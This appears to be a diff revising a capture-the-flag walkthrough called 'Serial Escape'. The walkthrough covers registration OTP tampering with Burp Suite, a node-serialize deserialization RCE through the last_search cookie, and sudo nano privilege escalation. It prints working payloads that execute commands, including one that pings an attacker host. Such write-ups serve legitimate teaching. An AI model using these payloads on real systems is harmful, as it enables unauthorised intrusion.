@@ -1,12 +1,14 @@
 # Serial Escape
 
-To start with you can run a simple NMAP scan against the target.
-```
+You can begin by running a basic NMAP scan on the target.
+
+```bash
 nmap -sV -v <target IP>
 ```
+
 ![image](./images/2024-09-25_17h30_17.png)
 
-Based on the NMAP results, there are two open ports: SSH (22) and HTTP (80).
+Based on the NMAP result, there are two open ports: SSH (22) and HTTP (80).
 If you navigate to the target IP address on a browser you will see a page as follows.
 
 ![image](./images/2024-09-25_17h30_48.png)
@@ -25,8 +27,8 @@ Upon registering, the application sends an OTP code to the provided email for ve
 
 ![image](./images/2024-09-25_18h56_23.png)
 
-So, you can fill out the registration form with dummy inputs, capture the network traffic with Burp Suite, and replace the email address with one of your choice (either an email you own or a temporary/disposable email) to receive the OTP code and pass verification.
-For demonstration purposes, a temporary email was used.
+You can complete the registration form with dummy data, capture the network traffic using Burp Suite, and modify the email field to use an address of your choice — either a personal email or a temporary/disposable one to receive the OTP and complete verification. For demonstration purposes, a temporary email was used.
+
 https://temp-mail.org/
 
 ![image](./images/2024-09-25_17h36_49.png)
@@ -41,7 +43,7 @@ To complete the registration process, enter the OTP code and submit.
 ![image](./images/2024-09-25_17h39_31.png)
 
 As a result, you will be redirected to the login page with a success message indicating that you have successfully created a new user.
-Having a user on the web application you can log in now. On the home page, you will see the first flag for the CTF.
+Having a user on the web application you can now log in. On the home page, you will see the first flag for the CTF.
 
 ![image](./images/2024-09-25_17h39_50.png)
 
@@ -55,9 +57,9 @@ According to this message, you can understand that your next step will be downlo
 
 ![image](./images/2024-09-25_17h41_42.png)
 
-To begin your code review, start with the ```app.js``` file. In the ```app.js``` file, you'll also notice a warning comment regarding the ```node-serialize``` package.
+To begin your code review, start with the ```app.js``` file. In the ```app.js``` file, you'll again notice a warning comment regarding the ```node-serialize``` package.
 
-![image](./images/2024-09-25_17h43_07.png)
+![image](./images/2024-09-27_22h13_01.png)
 
 To identify what the node-serialize package is vulnerable to, you can search online. You'll discover that it has a critical vulnerability: arbitrary remote code execution, which is explained in the following link. This vulnerability specifically affects the ```unserialize``` function, according to the explanation.
 https://security.snyk.io/vuln/npm:node-serialize:20170208
@@ -69,13 +71,13 @@ Knowing that the web application is vulnerable to remote code execution, you can
 To understand how and for what functionality of the web application the ```node-serialize``` package is used, open the JavaScript file responsible for the home page.
 Upon reviewing the code, two key points emerge:
 * When a user searches for a keyword, it is taken from the request, serialized, and stored in a cookie named ```last_search```.
-* During each GET request to the home page, the value of the ```last_search``` cookie is retrieved, **_UNSERIALIZED_**. (which is the vulnerable part), and passed to the client side for display.
+* During each GET request to the home page, the value of the ```last_search``` cookie is retrieved, **_UNSERIALIZED_** (which is the vulnerable part), and passed to the client side to be displayed.
 
 This functionality allows users to see their most recent search by storing its value in a cookie.
 
 ![image](./images/2024-09-25_17h54_27.png)
 
-In the image below, you can see an example of the usage of this functionality.
+In the image below, you can see an example usage of this functionality.
 
 ![image](./images/2024-09-25_18h12_04.png)
 
@@ -86,9 +88,9 @@ You can find an example payload from the link provided earlier.
 {"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}
 ```
 
-To adapt this payload for our target application, we need to remove the dictionary structure, enclosing double quotes, and any escaped characters, keeping only the core payload.
+To adjust the payload for our target application, we need to strip away the dictionary structure, remove enclosing double quotes, escape characters, leaving only the core payload.
 
-To test if the payload works, we can attempt to ping our attacking machine and verify whether the command executes. To detect the ping requests, start a ```tcpdump``` on the attacker machine to monitor ICMP traffic.
+To test if the payload works, we can attempt to ping our attacking machine and verify whether the injected system command is executed. To detect the ping requests, start a ```tcpdump``` on the attacker machine to monitor ICMP traffic.
 
 ```javascript
 _$$ND_FUNC$$_function (){require('child_process').exec('ping <attacker IP> -c 3', function(error, stdout, stderr) { console.log(stdout) });}()
@@ -130,4 +132,3 @@ https://gtfobins.github.io/gtfobins/nano/#sudo
 As a result, you will gain elevated privileges on the target machines under the root user and will be able to read the last flag for the CTF.
 
 ![image](./images/2024-09-25_18h34_12.png)
-
